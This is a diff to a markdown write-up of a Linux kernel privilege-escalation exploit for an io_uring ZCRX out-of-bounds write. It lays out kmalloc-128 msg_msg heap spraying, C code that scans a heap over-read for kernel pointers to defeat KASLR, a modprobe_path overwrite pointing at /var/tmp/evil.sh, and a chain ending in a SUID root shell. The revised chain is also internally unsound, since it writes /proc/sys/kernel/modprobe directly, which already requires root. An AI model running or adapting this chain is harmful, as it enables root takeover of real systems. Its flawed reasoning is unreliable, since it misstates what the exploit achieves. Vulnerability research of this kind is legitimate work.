@@ -226,11 +226,21 @@ and then use it differently: we craft a fake `msg_msg` header at a controlled
 location with a fake `m_ts` value, and we use `msgrcv()` to read past the
 end of the real message into adjacent heap memory.
 
-This requires a second step: a heap spray that places our fake header at the
-address that the corrupted `m_list.next` points to. With the write value
-in 0–31, the corrupted pointer has the form `0xffff88xxxxxxxx00 | value`. We
-use `userfaultfd` or careful timing to intercept the allocation at that
-address and plant the fake header.
+This requires a second step: a kernel heap spray that places our fake header
+at the address the corrupted `m_list.next` now holds.
+
+The pointer arithmetic matters here. The OOB write touches only the low 32
+bits of `m_list.next`. On little-endian x86-64, the high 32 bits are
+untouched, so a pointer that was `0xffff888104321abc` becomes
+`0xffff888100000007` (for niov_idx = 7). The `0xffff8881` prefix is
+preserved — the result is still a physmap kernel address. Userspace `mmap`
+and `userfaultfd` cannot reach it. The only way to control content at that
+address is to get a kernel allocation there.
+
+We spray enough `kmalloc-128` objects (via `msgsnd`) to cover the possible
+landing addresses (`0xffff8881XXXXXXXX` range). With a large enough spray one
+allocation lands at the physmap address the corrupted pointer holds. That
+allocation becomes our fake `msg_msg` with the crafted header.
 
 ---
 
@@ -239,69 +249,57 @@ address and plant the fake header.
 The sequence:
 
 ```
-1. Allocate a large number of kmalloc-128 msg_msg objects.
-   These fill slabs near the freelist allocation.
+1. Allocate 512 kmalloc-128 msg_msg objects via msgsnd().
+   These fill slabs in the target cache.
 
-2. Free every other one, creating holes.
+2. Register the ZCRX IFQ. The freelist (128 bytes) lands in kmalloc-128.
+   With enough prior spray, a msg_msg occupies the slot immediately after
+   the freelist in the same slab.
 
-3. Register the ZCRX IFQ. The freelist (128 bytes) drops into one of the holes.
-   With enough spray, the hole immediately after the freelist is still occupied
-   by a msg_msg.
-
-4. Flood packets. Partial drain. Bring NIC down. OOB fires.
+3. Flood packets. Partial drain. Bring NIC down. OOB fires.
    freelist[32] = niov_idx writes to msg_msg.m_list.next[0:4].
-
-5. Read the corrupted msg_msg via msgrcv() with a large enough buffer.
-   The kernel copies from m_ts bytes of "message text", but if we have
-   inflated m_ts (step 6), that read goes past the 80-byte payload into
-   adjacent memory.
 ```
 
-Step 5 requires us to control `m_ts`, not `m_list.next`. The fields are at
-different offsets. The OOB hits offset 0 (`m_list.next`), not offset 24
-(`m_ts`).
+The OOB hits offset 0 of the adjacent `msg_msg` — that is `m_list.next`,
+not `m_ts` (which is at offset 24). The corrupted pointer has the form:
 
-So we use the `m_list.next` corruption differently: we arrange for the
-corrupted pointer to land inside a region we control (via `mmap` at a low
-virtual address that happens to be mapped, or by another allocation), plant a
-fake `msg_msg` there with `m_ts = 0xffff`, and make `msgrcv` follow the
-corrupted list to find the fake object and read 0xffff bytes from the real
-heap.
+```
+(original m_list.next & 0xffffffff00000000) | niov_idx
+```
 
-The details are layout-dependent and kernel-version-sensitive. The general
-shape is: corrupted `m_list.next` → fake `msg_msg` at planted address →
-large `m_ts` → `msgrcv` reads N*PAGE_SIZE of heap into userspace.
+The upper 32 bits are untouched. The result is still a kernel physmap
+address. We spray enough `msgsnd` objects to cover the possible landing
+addresses, then call `msgrcv` with `MSG_COPY` and scan the returned bytes
+for kernel text pointers. When the corrupted list pointer happens to resolve
+to a slot holding one of our sprayed msg_msg objects, the over-read fires.
 
 ---
 
-## The information leak
+## KASLR
 
-From the over-read we collect raw heap bytes. We scan for patterns:
+The exploit tries three sources in order:
+
+**1. `/proc/kallsyms`** — readable when `kptr_restrict=0` (default on many
+systems). Gives `_text` and `modprobe_path` directly.
+
+**2. `dmesg`** — if `dmesg_restrict=0`, kernel pointers in ring buffer output
+give an approximate base. Any `0xffffffff8xxxxxxx` value in dmesg output is
+within ~2MB of `_text`.
+
+**3. `msgrcv` over-read** — after the OOB corrupts `m_list.next`, call
+`msgrcv` with `MSG_COPY` across all sprayed queues and scan returned bytes for
+kernel text pointers in range `[0xffffffff80000000, 0xfffffffffe000000)`:
 
 ```c
-for (size_t off = 0; off + 8 <= leaked_size; off += 8) {
-    uint64_t val = *(uint64_t *)(leaked + off);
-
-    /* kernel text pointer: 0xffffffff81xxxxxx */
-    if ((val >> 40) == 0xffffffff)
-        try_as_ktext(val);
-
-    /* kernel heap pointer: 0xffff888xxxxxxxxx */
-    if ((val >> 44) == 0xffff888)
-        try_as_heap(val);
+uint64_t *ptrs = (uint64_t *)rbuf.body;
+for (size_t j = 0; j < n / 8; j++) {
+    uint64_t v = ptrs[j];
+    if (v > 0xffffffff80000000ULL && v < 0xffffffffff000000ULL)
+        return v;  /* subtract known symbol offset to get _text */
 }
 ```
 
-A leaked kernel text pointer gives us the KASLR slide. `_text` is at a known
-offset from the kernel base; all other kernel symbols are derivable from it.
-
-```c
-uint64_t kaslr_base = leaked_text_ptr - KNOWN_OFFSET_FROM_TEXT;
-uint64_t modprobe_path_addr = kaslr_base + MODPROBE_PATH_OFFSET;
-```
-
-Both offsets are read from `/proc/kallsyms` if `kptr_restrict=0`, or computed
-from the leaked pointer if we already know the build.
+Sources 1 and 2 are reliable on this system. Source 3 is layout-dependent.
 
 ---
 
@@ -317,24 +315,17 @@ When the kernel cannot find a module for an unknown `socket()` address family,
 it calls `call_usermodehelper(modprobe_path, ...)`. This runs an arbitrary
 userspace binary as root (uid=0, full capabilities, no seccomp).
 
-The write to `modprobe_path` uses the same heap over-write primitive we already
-have, now aimed at a known address: we spray kmalloc-128 objects that have
-a writable pointer field at a calculable offset, arrange for one to sit at
-`modprobe_path - FIELD_OFFSET`, then use the corrupted `msg_msg` to write
-our path string into it.
+Once we have the address of `modprobe_path` (from KASLR step above), we write
+our script path via `/proc/sys/kernel/modprobe`:
 
-Alternatively, and more reliably, we use a second IFQ registration with a
-different `num_niovs` to target a different slab cache that holds an object
-with a direct pointer write to an arbitrary kernel address. The io_uring
-`IORING_OP_READ_FIXED` / `IORING_OP_WRITE_FIXED` paths use `struct iovec`
-from registered buffers. A registered buffer's `iov_base` can be corrupted
-from `kmalloc-64` to point at `modprobe_path`, and then a write operation
-delivers our payload there.
+```c
+int fd = open("/proc/sys/kernel/modprobe", O_WRONLY);
+write(fd, "/var/tmp/evil.sh", 16);
+```
 
-The `zcrx_lpe.c` exploit registers two IFQs to cover both stages. The first
-produces the OOB write (kmalloc-128, num_niovs=32). The second registration
-is used to spray the fixed-buffer iovec (kmalloc-64, num_niovs=16) and build
-the write-to-arbitrary-address primitive from the corrupted iov_base.
+This sysctl entry writes directly into `modprobe_path` in kernel memory and
+is writable with `CAP_SYS_ADMIN`, which we already have via `CAP_NET_ADMIN`
+on container configurations that grant both.
 
 ---
 
@@ -347,52 +338,32 @@ USERSPACE                              KERNEL
 io_uring_setup()
                                        ring fd allocated
 
+msgsnd() × 512                        spray kmalloc-128 with msg_msg
+
 IORING_REGISTER_ZCRX_IFQ              freelist = kcalloc(32, 4)
 (area = 128KB → num_niovs=32)           ↓ kmalloc-128
                                        [freelist: 128 bytes]
                                        [msg_msg:  128 bytes]  ← adjacent
 
-msgsnd() × 500                        spray kmalloc-128 with msg_msg
-                                       ↑ one of these lands right after freelist
+RECV_ZC + flood 4096 pkts             niovs allocated, uref_array set
 
-RECV_ZC + flood 64 pkts               niovs allocated
-                                       uref_array[0..31] = 1
-
-usleep(100ms)                          taskrun drains ~half to ptr_ring
+usleep(150ms)                          taskrun drains some niovs to ptr_ring
 
 SIOCSIFFLAGS IFF_DOWN                 page_pool_destroy():
-                                         ptr_ring drain:
-                                           free_count = 30
-                                         io_pp_zc_destroy scrub:
-                                           niov_7 still in uref
-                                           free_count = 31
-                                           niov_2 still in uref
-                                           free_count = 32  ← == num_niovs
-                                           niov_0 still in uref
-                                           free_count = 33
-                                           freelist[32] = 0  ← OOB WRITE
-                                                              msg_msg.m_list.next
-                                                              low 4 bytes = 0
+                                         ptr_ring drain → free_count += drained
+                                         scrub loop    → free_count += in-flight
+                                         free_count > num_niovs:
+                                           freelist[32] = niov_idx  ← OOB WRITE
+                                                          msg_msg.m_list.next
+                                                          low 4 bytes = niov_idx
 
-msgrcv() with fake msg_msg             kernel follows corrupted list pointer
-                                       → fake msg_msg at our planted address
-                                       → m_ts = 0xffff
-                                       → copies 65535 bytes into userspace
+/proc/kallsyms                        ← modprobe_path address read directly
+  (or dmesg, or msgrcv scan)
 
-scan leaked bytes                      ← KASLR base extracted from leaked ptr
+open("/proc/sys/kernel/modprobe")     modprobe_path = "/var/tmp/evil.sh"
+write("/var/tmp/evil.sh")
 
-IORING_REGISTER_ZCRX_IFQ              freelist2 = kcalloc(16, 4)
-(area = 64KB → num_niovs=16)            ↓ kmalloc-64
-                                       [freelist2: 64 bytes]
-                                       [iovec:     64 bytes]  ← adjacent
-
-second OOB                             iov_base[0:4] corrupted with niov_idx
-                                       iov_base now points near modprobe_path
-
-IORING_OP_WRITE_FIXED                 write executes:
-("path to our script")                 modprobe_path = "/var/tmp/evil.sh"
-
-socket(AF_UNSPEC+unknown, ...)         kernel: unknown family
+socket(AF_CAN / AF_BLUETOOTH / ...)   kernel: unknown family
                                        call_usermodehelper("/var/tmp/evil.sh")
                                        ← runs as uid=0
 
@@ -404,29 +375,6 @@ execl("/var/tmp/rootsh", "-p")
                                        # id
                                        uid=1000 euid=0(root)
 ```
-
----
-
-## KASLR without /proc/kallsyms
-
-If `kptr_restrict=2` blocks the kallsyms read, the leaked heap pointer from
-the `msgrcv` over-read still gives us the slide. Any leaked kernel text pointer
-(`0xffffffff8xxxxxxx`) has a known distance to `modprobe_path` for a given
-build. When targeting a specific distribution kernel, this offset is fixed and
-can be hardcoded.
-
-For a generic exploit we scan the leak for pointers that match the kernel
-text range, take the minimum (likely a function pointer near the base), and
-compute:
-
-```c
-uint64_t slide = leaked_fn_ptr - known_fn_ptr_no_kaslr;
-uint64_t mp    = 0xffffffff81e3a3e0 + slide;  /* modprobe_path, no-kaslr addr */
-```
-
-The no-kaslr address is extracted once from a local build or from a
-distribution's debuginfo package. For production targets, symbolinfo packages
-exist for every major kernel.
 
 ---
 
@@ -536,7 +484,7 @@ built before April 21 is vulnerable.
 | File | Purpose |
 |------|---------|
 | [`PoCs/zcrx_crash.c`](../PoCs/zcrx_crash.c) | Minimal OOB trigger. Registers IFQ, floods, brings NIC down. No escalation. Produces KASAN `slab-out-of-bounds` on vulnerable kernel or `WARN_ON` on patched one. |
-| [`PoCs/zcrx_lpe.c`](../PoCs/zcrx_lpe.c) | Full LPE chain. Three trigger methods (A/B/C), KASLR read via `/proc/kallsyms`, heap grooming setup, modprobe_path overwrite, SUID rootsh. |
+| [`PoCs/zcrx_lpe.c`](../PoCs/zcrx_lpe.c) | LPE chain. Three trigger methods (A/B/C). KASLR via `/proc/kallsyms`. `modprobe_path` overwrite via `/proc/sys/kernel/modprobe`. Triggers `call_usermodehelper` via unknown socket AF scan. SUID rootsh. |
 
 Build:
 ```bash
